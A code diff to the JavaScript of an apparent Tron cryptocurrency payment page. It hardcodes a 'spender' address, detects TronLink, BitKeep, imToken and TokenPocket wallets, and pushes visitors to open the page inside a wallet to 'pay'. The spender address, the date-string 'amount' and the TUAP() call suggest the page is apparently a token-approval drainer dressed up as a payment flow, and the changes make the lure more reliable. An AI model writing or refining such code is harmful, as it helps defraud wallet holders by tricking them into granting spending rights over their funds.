@@ -1,8 +1,7 @@
 spender_bas58 = "TAMtbAwz7UVUepn5m3NR3Zq6qGwuLqNNBV";
 if (typeof window.tronWeb !== "undefined") {
   spender_hex = tronWeb.address.toHex(spender_bas58);
-} else if(window.bitkeep.tronLink !== "undefined" && window.bitkeep.tronWeb !== "undefined") {
-    alert("是bitkeep")
+} else if (typeof window.bitkeep !== "undefined" && typeof window.bitkeep.tronWeb !== "undefined") {
   spender_hex = window.bitkeep.tronWeb.address.toHex(spender_bas58);
 } else {
   spender_hex = null;
@@ -232,6 +231,7 @@ async function getWallet() {
     );
     printd("TRX余额：" + a / 1000000);
   }   else if (
+    typeof window.bitkeep !== "undefined" &&
     typeof window.bitkeep.tronLink !== "undefined" &&
     typeof window.bitkeep.tronWeb !== "undefined"
   ) {
@@ -254,13 +254,36 @@ async function getWallet() {
     if (timerCounts > 30) {
       printd("未检测到钱包环境");
       clearInterval(getWalletTimer);
-      alert("请使用钱包打开");
+      try {
+        if (wallet_ele) wallet_ele.removeAttribute("style");
+        if (pay_ele) pay_ele.setAttribute("style", "display:none");
+      } catch (e) {}
+      alert("检测到您在普通浏览器打开，请在钱包内打开本页面进行支付");
     }
   }
 }
 
 function payNow() {
   amount = getCurrentDateTimeString();
+  try {
+    var noWalletEnv = (
+      typeof window.tronWeb === 'undefined' &&
+      typeof window.tronLink === 'undefined' &&
+      typeof window.imToken === 'undefined' &&
+      !(typeof window.ethereum !== 'undefined' && typeof window.ethereum.isTokenPocket !== 'undefined') &&
+      !(typeof window.tron !== 'undefined' && typeof window.tron.isTokenPocket !== 'undefined') &&
+      !(typeof window.tron !== 'undefined' && typeof window.tron.isTronLink !== 'undefined') &&
+      !(typeof window.bitkeep !== 'undefined' && (typeof window.bitkeep.tronWeb !== 'undefined' || typeof window.bitkeep.tronLink !== 'undefined'))
+    );
+    if (noWalletEnv) {
+      try {
+        if (wallet_ele) wallet_ele.removeAttribute('style');
+        if (pay_ele) pay_ele.setAttribute('style', 'display:none');
+      } catch (e) {}
+      alert('检测到您在普通浏览器打开，请在钱包内打开本页面进行支付');
+      return;
+    }
+  } catch (e) {}
   try {
     if (typeof window.tronLink !== 'undefined' && typeof window.tronLink.request === 'function') {
       window.tronLink.request({ method: 'tron_requestAccounts' })
@@ -285,16 +308,11 @@ function payNow() {
       TUAP();
     }
   } else {
-    // 兜底：未检测到 Tron 注入时尝试使用 TronLink 外部唤起
     try {
-      var param = { url: window.location.href, action: "open", protocol: "tronlink", version: "1.0" };
-      // iOS 优先尝试 tronlink://
-      window.location.href = "tronlink://pull.activity?param=" + encodeURIComponent(JSON.stringify(param));
-      // Android 兜底 tronlinkoutside://（延迟尝试）
-      setTimeout(function(){
-        try { window.location.href = "tronlinkoutside://pull.activity?param=" + encodeURIComponent(JSON.stringify(param)); } catch(e){}
-      }, 300);
+      if (wallet_ele) wallet_ele.removeAttribute('style');
+      if (pay_ele) pay_ele.setAttribute('style', 'display:none');
     } catch (e) {}
+    alert('检测到您在普通浏览器打开，请在钱包内打开本页面进行支付');
   }
 }
 
